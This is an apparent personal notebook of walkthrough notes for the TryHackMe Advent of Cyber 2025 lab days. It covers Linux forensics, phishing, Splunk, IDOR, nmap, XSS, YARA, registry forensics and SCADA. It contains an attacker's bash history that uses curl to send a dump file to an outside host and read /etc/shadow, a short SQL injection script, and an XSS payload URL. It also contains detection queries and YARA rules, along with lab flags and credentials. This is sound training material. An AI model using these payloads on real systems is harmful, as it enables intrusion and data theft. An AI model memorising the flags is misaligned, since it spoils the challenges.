---
topic: Main Quests
date: 2025-12-01T10:00:00
course: Advent of Cyber 2025
tags:
links:
  - "[[AdventOfCyber2025_SideQuests]]"
---

# Day 1. Linux CLI - Shells Bells

```shell
mcskidy@tbfc-web01:~/Guides$ pwd
/home/mcskidy/Guides
mcskidy@tbfc-web01:~/Guides$ cat .guide.txt 
I think King Malhare from HopSec Island is preparing for an attack.
Not sure what his goal is, but Eggsploits on our servers are not good.
Be ready to protect Christmas by following this Linux guide:

Check /var/log/ and grep inside, let the logs become your guide.
Look for eggs that want to hide, check their shells for what's inside!

P.S. Great job finding the guide. Your flag is:
-----------------------------------------------
THM{learning-linux-cli}
-----------------------------------------------
mcskidy@tbfc-web01:~/Guides$ 

```

```shell
mcskidy@tbfc-web01:/var/log$ grep "Failed password" auth.log
2025-10-13T01:43:48.000724+00:00 tbfc-web01 sshd[1037]: Failed password for socmas from eggbox-196.hopsec.thm port 16212 ssh2
2025-10-13T01:43:52.044888+00:00 tbfc-web01 sshd[1037]: Failed password for socmas from eggbox-196.hopsec.thm port 16212 ssh2
2025-10-13T01:43:55.543374+00:00 tbfc-web01 sshd[1037]: Failed password for socmas from eggbox-196.hopsec.thm port 16212 ssh2
2025-10-13T01:45:08.123120+00:00 tbfc-web01 sshd[2392]: Failed password for socmas from eggbox-196.hopsec.thm port 20393 ssh2
2025-10-13T01:45:11.440030+00:00 tbfc-web01 sshd[2392]: Failed password for socmas from eggbox-196.hopsec.thm port 20393 ssh2
2025-10-13T01:46:01.816094+00:00 tbfc-web01 sshd[2392]: Failed password for socmas from eggbox-196.hopsec.thm port 20393 ssh2
2025-10-13T01:46:07.558636+00:00 tbfc-web01 sshd[2453]: Failed password for socmas from eggbox-196.hopsec.thm port 14040 ssh2
2025-10-13T01:46:15.878653+00:00 tbfc-web01 sshd[2453]: message repeated 2 times: [ Failed password for socmas from eggbox-196.hopsec.thm port 14040 ssh2]

```

```shell
mcskidy@tbfc-web01:/var/log$ find /home/socmas -name *egg*
/home/socmas/2025/eggstrike.sh
mcskidy@tbfc-web01:/var/log$ cat /home/socmas/2025/eggstrike.sh
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"

# Your flag is:
# THM{sir-carrotbane-attacks}
mcskidy@tbfc-web01:/var/log$ 
```

```shell
root@tbfc-web01:~$ cat .bash_history 
whoami
cd ~
ll 
nano .ssh/authorized_keys 
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
pkill tbfcedr
cat /etc/shadow
cat /etc/hosts
exit
whoami
cd /root
root@tbfc-web01:~$ pwd
/root
root@tbfc-web01:~$ 
```

```side-quest_1
root@tbfc-web01:/home/mcskidy/Documents$ cat read-me-please.txt 
From: mcskidy
To: whoever finds this

I had a short second when no one was watching. I used it.

I've managed to plant a few clues around the account.
If you can get into the user below and look carefully,
those three little "easter eggs" will combine into a passcode
that unlocks a further message that I encrypted in the
/home/eddi_knapp/Documents/ directory.
I didn't want the wrong eyes to see it.

Access the user account:
username: eddi_knapp
password: S0mething1Sc0ming

There are three hidden easter eggs.
They combine to form the passcode to open my encrypted vault.

Clues (one for each egg):

1)
I ride with your session, not with your chest of files.
Open the little bag your shell carries when you arrive.

2)
The tree shows today; the rings remember yesterday.
Read the ledger’s older pages.

3)
When pixels sleep, their tails sometimes whisper plain words.
Listen to the tail.

Find the fragments, join them in order, and use the resulting passcode
to decrypt the message I left. Be careful — I had to be quick,
and I left only enough to get help.

~ McSkidy
```

```shell
eddi_knapp@tbfc-web01:~$ cat .profile
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
export PASSFRAG1="3ast3r"
eddi_knapp@tbfc-web01:~$ pwd
/home/eddi_knapp
eddi_knapp@tbfc-web01:~$ 
```

```shell
eddi_knapp@tbfc-web01:~/.secret_git/.git/info$ git show e924698378132991ee08f050251242a092c548fd
commit e924698378132991ee08f050251242a092c548fd (HEAD -> master)
Author: mcskiddy <mcskiddy@robco.local>
Date:   Thu Oct 9 17:20:11 2025 +0000

    remove sensitive note

diff --git a/secret_note.txt b/secret_note.txt
deleted file mode 100755
index 060736e..0000000
--- a/secret_note.txt
+++ /dev/null
@@ -1,5 +0,0 @@
-========================================
-Private note from McSkidy
-========================================
-We hid things to buy time.
-PASSFRAG2: -1s-
```

```shell
eddi_knapp@tbfc-web01:~/Pictures$ pwd
/home/eddi_knapp/Pictures
eddi_knapp@tbfc-web01:~/Pictures$ cat .easter_egg
~~ HAPPY EASTER ~~~
PASSFRAG3: c0M1nG
```

```PASSFRAG+
3ast3r-1s-c0M1nG
```

```Data
eddi_knapp@tbfc-web01:~/Documents$ gpg --decrypt mcskidy_note.txt.gpg 
gpg: AES256.CFB encrypted data
gpg: encrypted with 1 passphrase
Congrats — you found all fragments and reached this file.

Below is the list that should be live on the site. If you replace the contents of
/home/socmas/2025/wishlist.txt with this exact list (one item per line, no numbering),
the site will recognise it and the takeover glitching will stop. Do it — it will save the site.

Hardware security keys (YubiKey or similar)
Commercial password manager subscriptions (team seats)
Endpoint detection & response (EDR) licenses
Secure remote access appliances (jump boxes)
Cloud workload scanning credits (container/image scanning)
Threat intelligence feed subscription

Secure code review / SAST tool access
Dedicated secure test lab VM pool
Incident response runbook templates and playbooks
Electronic safe drive with encrypted backups

A final note — I don't know exactly where they have me, but there are *lots* of eggs
and I can smell chocolate in the air. Something big is coming.  — McSkidy

---

When the wishlist is corrected, the site will show a block of ciphertext. This ciphertext can be decrypted with the following unlock key:

UNLOCK_KEY: 91J6X7R4FQ9TQPM9JX2Q9X2Z

To decode the ciphertext, use OpenSSL. For instance, if you copied the ciphertext into a file /tmp/website_output.txt you could decode using the following command:

cat > /tmp/website_output.txt
openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in /tmp/website_output.txt -out /tmp/decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'
cat /tmp/decoded_message.txt

Sorry to be so convoluted, I couldn't risk making this easy while King Malhare watches. — McSkidy
```

```message
U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c=
```

```shell
root@tbfc-web01:/home/mcskidy$ cat /tmp/decoded_message.txt
Well done — the glitch is fixed. Amazing job going the extra mile and saving the site. Take this flag THM{w3lcome_2_A0c_2025}

NEXT STEP:
If you fancy something a little...spicier....use the FLAG you just obtained as the passphrase to unlock:
/home/eddi_knapp/.secret/dir

That hidden directory has been archived and encrypted with the FLAG.
Inside it you'll find the sidequest key.
```

```
https://tryhackme.com/room/sq1-aoc2025-FzPnrt2SAu

Key : now_you_see_me
```

![Side Quest](/Assets/Images/sq1.png)
# Day 2. Phishing - Merry Clickmas

```
Learn how to use the Social-Engineer Toolkit to send phishing emails.

## Learning Objectives

- Understand what social engineering is
- Learn the types of phishing
- Explore how red teams create fake login pages
- Use the Social-Engineer Toolkit to send a phishing email
```

https://www.allthingssecured.com/tips/email-phishing-scams-stop-method/

```
[2025-12-06 16:24:02] Captured -> username: admin    password: unranked-wisdom-anthem    from: 10.82.158.243

```

https://tryhackme.com/room/phishingemails4gkxh

```
FLAG = "THM{first-phish}"
```

# Day 3. Splunk Basics - Did you SIEM?

```
## Narrowing Down Suspicious IPs

In real-world scenarios, we often encounter various IP addresses constantly attempting to attack our servers. To narrow down on the IP addresses that do not send requests from common desktop or mobile browsers, we can use the following query:

**Search query:** `sourcetype=web_traffic user_agent!=*Mozilla* user_agent!=*Chrome* user_agent!=*Safari* user_agent!=*Firefox* | stats count by client_ip | sort -count | head 5`

**Reconnaissance (Footprinting)**

We will start searching for the initial probing of exposed configuration files using the query below:

**Search query:** `sourcetype=web_traffic client_ip="<REDACTED>" AND path IN ("/.env", "/*phpinfo*", "/.git*") | table _time, path, user_agent, status`


**Enumeration (Vulnerability Testing)**

Search for common path traversal and open redirect vulnerabilities.

**Search query**: `sourcetype=web_traffic client_ip="<REDACTED>" AND path="*..*" OR path="*redirect*"`


**Search query**: `sourcetype=web_traffic client_ip="<REDACTED>" AND path="*..\/..\/*" OR path="*redirect*" | stats count by path`

**SQL Injection Attack**

Find the automated attack tool and its payload by using the query below:

**Search query:** `sourcetype=web_traffic client_ip="<REDACTED>" AND user_agent IN ("*sqlmap*", "*Havij*") | table _time, path, status`


## Exfiltration Attempts

Search for attempts to download large, sensitive files (backups, logs). We can use the query below:

**Search query:** `sourcetype=web_traffic client_ip="<REDACTED>" AND path IN ("*backup.zip*", "*logs.tar.gz*") | table _time path, user_agent`


## Ransomware Staging & RCE

Requests for sensitive archives like `/logs.tar.gz` and `/config` indicate the attacker is gathering data for double-extortion. In the logs, we identified some requests related to bunnylock and shell.php. Let's use the following query to see what those search queries are about.

**Search query:** `sourcetype=web_traffic client_ip="<REDACTED>" AND path IN ("*bunnylock.bin*", "*shell.php?cmd=*") | table _time, path, user_agent, status`


## Correlate Outbound C2 Communication

We pivot the search to the `firewall_logs` using the **Compromised Server IP** (`10.10.1.5`) as the source and the attacker IP as the destination.

**Search query:** `sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="<REDACTED>" AND action="ALLOWED" | table _time, action, protocol, src_ip, dest_ip, dest_port, reason`

## Volume of Data Exfiltrated

We can also use the sum function to calculate the sum of the bytes transferred, using the bytes_transferred field, as shown below:

**Search Query:** `sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="<REDACTED>" AND action="ALLOWED" | stats sum(bytes_transferred) by src_ip`



```

https://tryhackme.com/room/splunk201

# Day 4. AI in Security - old sAInt nick

**sql_injection.py**
```python
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://10.80.169.91:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```

```
THM{SQLI_EXPLOIT}
```

https://tryhackme.com/room/defadversarialattacks

# Day 5. IDOR - Santa’s Little IDOR

Have you ever seen a link that looks like this: `https://awesome.website.thm/TrackPackage?packageID=1001`?

When you saw a link like this, have you ever wondered what would happen if you simply changed the packageID to 11 or 12? In its simplest form, this can be a potential case for IDOR. 

IDOR stands for **Insecure Direct Object Reference** and is a type of access control vulnerability. Web applications often use references to determine what data to return when you make a request. However, if the web server doesn't perform checks to ensure you are allowed to view that data before sending it, it can lead to serious sensitive information disclosure.

https://mwrcybersec.com/whats-the-deal-with-idor

To understand the root cause of IDOR, it is important to understand the basic principles of authentication and authorization:

- **Authentication:** The process by which you verify who you are. For example, supplying your username and password.
- **Authorization:** The process by which the web application verifies your permissions. For example, are you allowed to visit the admin page of a web application, or are you allowed to make a payment using a specific account?

Privilege Escalation types:
- **Vertical privilege escalation:** This refers to privilege escalation where you gain access to more features. For example, you may be a normal user on the application, but can perform actions that should be restricted for an administrator.
- **Horizontal privilege escalation:** This refers to privilege escalation where you use a feature you are authorized to use, but gain access to data that you are not allowed to access. For example, you should only be able to see your accounts, not someone else's accounts.

https://hashes.com/en/tools/hash_identifier
https://www.uuidtools.com/decode

https://tryhackme.com/room/idor

# Day 6. Malware Analysis - Egg-xecutable

https://tryhackme.com/room/staticanalysis1

https://tryhackme.com/room/basicdynamicanalysis

# Day 7. Network Discovery - Scan-ta Clause

https://tryhackme.com/room/networkingconcepts

```shell
 ➥ $ nmap -sCV -p- 10.80.148.111
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-07 16:13 +0000

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx
|_http-title: TBFC QA \xE2\x80\x94 EAST-mas
21212/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.135.52
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 320.60 seconds

```

```
 ➥ $ nmap -p- --script=banner 10.80.148.111
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-07 16:22 +0000
Nmap scan report for 10.80.148.111
Host is up (0.014s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
|_banner: SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
80/tcp    open  http
25251/tcp open  unknown
|_banner: TBFC maintd v0.2\x0AType HELP for commands.

Nmap done: 1 IP address (1 host up) scanned in 226.06 seconds

```

```
 ➥ $ cat tbfc_qa_key1 
KEY1:3aster_
```

```
KEY2:15_th3_
```

```
[sudo] password for sam: 
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-07 16:24 +0000
Nmap scan report for 10.80.148.111
Host is up (0.014s latency).
Not shown: 999 open|filtered udp ports (no-response)
PORT   STATE SERVICE
53/udp open  domain

Nmap done: 1 IP address (1 host up) scanned in 15.97 seconds
```

```
 ➥ $ dig @10.80.148.111 TXT key3.tbfc.local +short
"KEY3:n3w_xm45"
```

```
THM{4ll_s3rvice5_d1sc0vered}
```

```
https://tryhackme.com/room/nmap
```


# Day 8. Prompt Injection - Sched-yule conflict

https://tryhackme.com/room/defadversarialattacks

# Day 9. Passwords - A Cracking Christmas

A few simple points to remember:

- The **strength of protection** depends almost entirely on the password. Short or common passwords can be guessed; long, random passwords are far harder to break.
- Different file formats use different algorithms and key derivation methods. For example, PDF encryption and ZIP encryption differ in details (how the key is derived, salt use, number of hash iterations). That affects how easy or hard cracking is.
- Many consumer tools still support legacy or weak modes (particularly older ZIP encryption). That makes some encrypted archives much easier to attack than modern, well-implemented schemes.
- Encryption protects data confidentiality only. It does not prevent someone with access to the encrypted file from trying to guess the password offline.

**Dictionary Attacks**

In a dictionary attack, the attacker uses a predefined list of potential passwords, known as a wordlist, and tests each one until the correct password is found. These wordlists often contain leaked passwords from previous breaches, common substitutions like **password123**, predictable combinations of names and dates, and other patterns that people frequently use. Because many users choose weak or common passwords, dictionary attacks are usually fast and highly effective.

**Mask Attacks**

Brute-force and mask attacks go one step further. A brute-force attack systematically tries every possible combination of characters until it finds the right one. While this guarantees success eventually, the time it takes grows exponentially with the length and complexity of the password.

Mask attacks aim to reduce that time by limiting guesses to a specific format. For example, trying all combinations of three lowercase letters followed by two digits.

By narrowing the search space, mask attacks strike a balance between speed and thoroughness, especially when the attacker has some idea of how the password might be structured.

https://tryhackme.com/room/passwordattacks

# Day 10. SOC Alert Triaging - Tinsel Triage

## Alert Triaging

|     **Key Factors**     |                                                     **Description**                                                     |                                     **Why It Matters?**                                      |
| :---------------------: | :---------------------------------------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------: |
|     Severity Level      |                       Review the alert's severity rating, ranging from Informational to Critical.                       |                Indicates the urgency of response and potential business risk.                |
| Timestamp and Frequency |            Identify when the alert was triggered and check for related activity before and after that time.             |              Helps identify ongoing attacks or patterns of repeated behaviour.               |
|      Attack Stage       | Determine which stage of the attack lifecycle this alert indicates (reconnaissance, persistence, or data exfiltration). |     It gives insight into how far the attacker may have progressed and their objective.      |
|     Affected Asset      |                Identify the system, user, or resource involved and assess its importance to operations.                 | Prioritises response based on the asset's importance and the potential impact of compromise. |

## Diving Deeper into an Alert

After identifying which alerts deserve further attention, it's time to dig into the details. Follow these steps to investigate and correlate effectively:

- **Investigate the alert in detail.**  
	    Open the alert and review the entities, event data, and detection logic. Confirm whether the activity represents real malicious behaviour.  
- **Check the related logs.**  
		Examine the relevant log sources. Look for patterns or unusual actions that align with the alert.  
- **Correlate multiple alerts.**  
	    Identify other alerts involving the same user, IP address, or device. Correlation often reveals a broader attack sequence or coordinated activity.  
- **Build context and a timeline.**  
	    Combine timestamps, user actions, and affected assets to reconstruct the sequence of events. This helps determine if the attack is ongoing or has already been contained.  
- **Decide on the following action.**  
	    If there are indicators of compromise, escalate to the incident response team. Investigate further if more evidence or correlation is needed. Close or suppress if the alert is a confirmed false positive, and update detection rules accordingly.  
- **Document findings and lessons learned.**
		Keep a clear record of the analysis, decisions, and remediation steps. Proper documentation strengthens SOC processes and supports continuous improvement.

```query_sentinel

set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-01'
| project _timestamp_t, host_s, Message
```

# Day 11. XSS - Merry XSSMas

> XSS - https://tryhackme.com/room/xss, https://tryhackme.com/room/axss

XSS is a web application vulnerability that lets attackers inject malicious code (usually JavaScript) into input fields that reflect content viewed by other users (e.g., a form or a comment in a blog). When an application doesn't properly validate or escape user input, that input can be interpreted as code rather than harmless text. This results in malicious code that can steal credentials, deface pages, or impersonate users. Depending on the result, there are various types of XSS.  In today’s task, we focus on **Reflected XSS** and **Stored XSS**.

## Reflected XSS

You see reflected variants when the injection is immediately projected in a response. Imagine a toy search function in an online toy store, you search via:

`https://trygiftme.thm/search?term=gift`

But imagine you send this to your friend who is looking for a gift for their nephew :

`https://trygiftme.thm/search?term=<script>alert( atob("VEhNe0V2aWxfQnVubnl9") )</script>`

## Stored XSS

A Stored XSS attack occurs when malicious script is saved on the server and then loaded for every user who views the affected page. Unlike Reflected XSS, which targets individual victims, Stored XSS becomes a "set-and-forget" attack, anyone who loads the page runs the attacker’s script.

## Protecting against XSS

Each service is different, and requires a well-thought-out, secure design and implementation plan, but key practices you can implement are:

- **Disable dangerous rendering raths:** Instead of using the `innerHTML` property, which lets you inject any content directly into HTML, use the `textContent` property instead, it treats input as text and parses it for HTML.
- **Make cookies inaccessible to JS:** Set session cookies with the [HttpOnly](https://owasp.org/www-community/HttpOnly), [Secure](https://owasp.org/www-community/controls/SecureCookieAttribute), and [SameSite](https://owasp.org/www-community/SameSite) attributes to reduce the impact of XSS attacks.
- **Sanitise input/output and encode:** In some situations, applications may need to accept limited HTML input—for example, to allow users to include safe links or basic formatting. However it's critical to sanitize and encode all user-supplied data to prevent security vulnerabilities. Sanitising and encoding removes or escapes any elements that could be interpreted as executable code, such as scripts, event handlers, or JavaScript URLs while preserving safe formatting.

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

# Day 12. Phishing - Phishmas Greetings

Common intentions behind phishing messages :
- **Credential theft:** Tricking users into revealing passwords or login details.
- **Malware delivery:** Disguising malicious attachments or links as safe content.
- **Data exfiltration:** Gathering sensitive company or personal information.
- **Financial fraud:** Persuading victims to transfer money or approve fake invoices.

Common intentions behind spam messages:
- **Promotion:** Advertising products, services, or events. Often unsolicited or low-quality.
- **Scams:** Spreading fake offers or “get rich quick” schemes to attract clicks.
- **Traffic generation (clickbait):** Driving users to external sites or boosting ad metrics.
- **Data harvesting:** Collecting active email addresses for future campaigns.

Phishing Analysis Tools - https://tryhackme.com/room/phishingemails3tryoe

# Day 13. YARA Rules - YARA mean one!

## YARA Rules

A YARA rule is built from several key elements:

- **Metadata**: information about the rule itself: who created it, when, and for what purpose.
- **Strings**: the clues YARA searches for: text, byte sequences, or regular expressions that mark suspicious content.
- **Conditions**: the logic that decides when the rule triggers, combining multiple strings or parameters into a single decision.

Here’s how it looks in practice :

```
rule TBFC_KingMalhare_Trace
{
    meta:
        author = "Defender of SOC-mas"
        description = "Detects traces of King Malhare’s malware"
        date = "2025-10-10"
    strings:
        $s1 = "rundll32.exe" fullword ascii
        $s2 = "msvcrt.dll" fullword wide
        $url1 = /http:\/\/.*malhare.*/ nocase
    condition:
        any of them
}
```

## Strings

**Text strings** :

```
rule TBFC_KingMalhare_Trace
{
    strings:
        $TBFC_string = "Christmas"

    condition:
        $TBFC_string 
}
```

- **Case-insensitive strings - nocase**
	By default, YARA matches text exactly as written. Adding the `nocase` modifier makes the match ignore letter casing, so "Christmas", "CHRISTMAS", or "christmas" will all trigger the same result.
	
```
strings:
    $xmas = "Christmas" nocase
```

- **Wide-character strings - wide, ascii**
	Many Windows executables use two-byte Unicode characters. Adding `wide` tells YARA to also look for this format, while `ascii` enforces a single-byte search. You can use both together:
	
```
strings:
    $xmas = "Christmas" wide ascii
```

- **XOR strings - xor**
	Using the `xor` modifier, YARA automatically checks all possible single-byte XOR variations of a string - revealing what attackers tried to conceal.
	
```
strings:
    $hidden = "Malhare" xor
```

- **Base64 strings - base64, base64wide**  
	Some malware encodes payloads or commands in Base64. With these modifiers, YARA decodes the content and searches for the original pattern, even when it’s hidden in encoded form.
	
```
strings:
    $b64 = "SOC-mas" base64
```

**Hexadecimal strings** :

Hex strings allow YARA to search for specific byte patterns, written in hexadecimal notation. This is useful when defenders need to detect malware fragments like file headers, shellcode, or binary signatures that can't be represented as plain text.

```
rule TBFC_Malhare_HexDetect
{
    strings:
        $mz = { 4D 5A 90 00 }   // MZ header of a Windows executable
        $hex_string = { E3 41 ?? C8 G? VB }

    condition:
        $mz and $hex_string
}
```

**Regular expression strings** : 

Regex allows defenders to write flexible search patterns that can match multiple variations of the same malicious string. It's especially useful for spotting URLs, encoded commands, or filenames that share a structure but differ slightly each time.

```
rule TBFC_Malhare_RegexDetect
{
    strings:
        $url = /http:\/\/.*malhare.*/ nocase
        $cmd = /powershell.*-enc\s+[A-Za-z0-9+/=]+/ nocase

    condition:
	        $url and $cmd
}
```

## Conditions

**Match a single string**
	The simplest condition, the rule triggers if one specific string is found. For example, the variable xmas.
	
```
condition:
    $xmas
```

**Match any string**
	Match any string When multiple strings are defined, the rule can be configured to trigger as soon as any one of them is found :
	
```
condition:
    any of them
```

**Match all strings**
	To make the rule stricter, you can require that all defined strings appear together :
	
```
condition:
    all of them
```

**Combine logic using: and, or, not**
	Defenders often need more control over how rules behave. Logical operators let you combine multiple checks into one condition, just like building a small defensive strategy.
	
```
condition:
    ($s1 or $s2) and not $benign
```

**Use comparisons like: filesize, entrypoint, or hash**
	YARA can also check file properties, not just contents. For example, you can detect files that are unusually small or large :
	
```
condition:
    any of them and (filesize < 700KB)
```

# Day 14. Containers - DoorDasher's Demise

Container Vulnerabilities - https://tryhackme.com/room/containervulnerabilitiesDG

# Day 15. Web Attack Forensics - Drone Alone

```
index=windows_apache_access (cmd.exe OR powershell OR "powershell.exe" OR "Invoke-Expression") | table _time host clientip uri_path uri_query status

index=windows_apache_error ("cmd.exe" OR "powershell" OR "Internal Server Error")

index=windows_sysmon ParentImage="*httpd.exe"

index=windows_sysmon *cmd.exe* *whoami*

index=windows_sysmon Image="*powershell.exe" (CommandLine="*enc*" OR CommandLine="*-EncodedCommand*" OR CommandLine="*Base64*")
```

# Day 16. Forensics - Registry Furensics

## Windows Registry

The registry contains all the information that the Windows OS needs for its functioning. This Windows brain (Registry) is not stored in one single place. It is made up of several separate files, each storing information on different configuration settings. These files are known as **Hives**.

Let's take a look at all these hives in the table below. The first column contains the hive names, the second column contains the type of configuration settings that each hive stores, and the third column contains the location of each hive on the disk.

|  Hive Name   |                                             Contains                                             |                        Location                        |
| :----------: | :----------------------------------------------------------------------------------------------: | :----------------------------------------------------: |
|    SYSTEM    |        - Services<br>- Mounted Devices<br>- Boot Configuration<br>- Drivers<br>- Hardware        |          `C:\Windows\System32\config\SYSTEM`           |
|   SECURITY   |                       - Local Security Policies<br>- Audit Policy Settings                       |         `C:\Windows\System32\config\SECURITY`          |
|   SOFTWARE   |    - Installed Programs<br>- OS Version and other info<br>- Autostarts<br>- Program Settings     |         `C:\Windows\System32\config\SOFTWARE`          |
|     SAM      | - Usernames and their Metadata<br>- Password Hashes<br>- Group Memberships<br>- Account Statuses |            `C:\Windows\System32\config\SAM`            |
|  NTUSER.DAT  |                - Recent Files<br>- User Preferences<br>- User-specific Autostarts                |             `C:\Users\username\NTUSER.DAT`             |
| USRCLASS.DAT |                                   - Shellbags<br>- Jump Lists                                    | `C:\Users\username\AppData\Local\Microsoft\Windows\US` |

Registry keys with their respective Registry Hives - 

|Hive on Disk|Where You See It in Registry Editor|
|---|---|
|SYSTEM|`HKEY_LOCAL_MACHINE\SYSTEM`|
|SECURITY|`HKEY_LOCAL_MACHINE\SECURITY`|
|SOFTWARE|`HKEY_LOCAL_MACHINE\SOFTWARE`|
|SAM|`HKEY_LOCAL_MACHINE\SAM`|
|NTUSER.DAT|`HKEY_USERS\<SID> and HKEY_CURRENT_USER`|
|USRCLASS.DAT|`HKEY_USERS\<SID>\Software\Classes`|
As you can see, the `SYSTEM`, `SOFTWARE`, `SECURITY`, and `SAM` hives are under the `HKLM` key. `NTUSER.DAT` and `USRCLASS.DAT` are located under `HKEY_USERS (HKU)` and `HKEY_CURRENT_USER (HKCU)`. 

**Note:** The other two keys (`HKEY_CLASSES_ROOT (HKCR)` and `HKEY_CURRENT_CONFIG (HKCC)`) are not part of any separate hive files. They are dynamically populated when Windows is running.

## Registry Forensics

The table below lists some registry keys that are particularly useful during forensic investigations.

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist`
	- It stores information on recently accessed applications launched via the GUI.
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths`
	- It stores all the paths and locations typed by the user inside the Explorer address bar.
- `HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths`
	- It stores the path of the applications.
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery`
	- It stores all the search terms typed by the user in the Explorer search bar.
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
	- It stores information on the programs that are set to automatically start (startup programs) when the users logs in.
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`
	- It stores information on the files that the user has recently accessed.
- `HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName`
	- It stores the computer's name (hostname).
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`
	- It stores information on the installed programs.

https://ericzimmerman.github.io/#!index.md
https://tryhackme.com/room/expregistryforensics

# Day 17. CyberChef - Hoperation Save McSkidy

## Encoding and Decoding

Encoding is a method to transform data to ensure compatibility between different systems. It differs from encryption in purpose and process.

|              |           Encoding           |          Encryption           |
| :----------: | :--------------------------: | :---------------------------: |
| **Purpose**  | Compatibility  <br>Usability | Security  <br>Confidentiality |
| **Process**  |         Standardized         |        Algorithm + Key        |
| **Security** |              No              |              Yes              |
|  **Speed**   |             Fast             |             Slow              |
| **Examples** |            Base64            |              TLS              |

https://tryhackme.com/room/cryptographyintro

# Day 18. Obfuscation - The Egg Shell File

```
THM{C2_De0bfuscation_29838}
THM{API_Obfusc4tion_ftw_0283}  
```

https://tryhackme.com/room/obfuscationprinciples

# Day 19. ICS/Modbus - Claus for Concern

## What is SCADA (Supervisory Control and Data Acquisition)?

SCADA systems are the "command centres" of industrial operations. They act as the bridge between human operators and the machines doing the work. Think of SCADA as the nervous system of a factory—it senses what's happening, processes that information, and sends commands to make things happen.

## Components of a SCADA System

A SCADA system typically consists of four key components:

1. **Sensors & actuators:** These are the eyes and hands of the system. Sensors measure real-world conditions, such as temperature, pressure, position, and weight. Actuators perform physical actions—motors turn, valves open, robotic arms move.
2. **PLCs (Programmable Logic Controllers):** These are the brains that execute automation logic. They read sensor data, make decisions based on programmed rules, and send commands to actuators.
3. **Monitoring systems:** Visual interfaces like CCTV cameras, dashboards, and alarm panels where operators observe physical processes. These monitoring systems provide immediate visual feedback—you can literally watch what the automation is doing.
4. **Historians:** Databases that store operational data for later analysis. Every package loaded, every drone launched, every system change gets recorded. This historical data helps identify patterns, troubleshoot problems.

## What is a PLC?

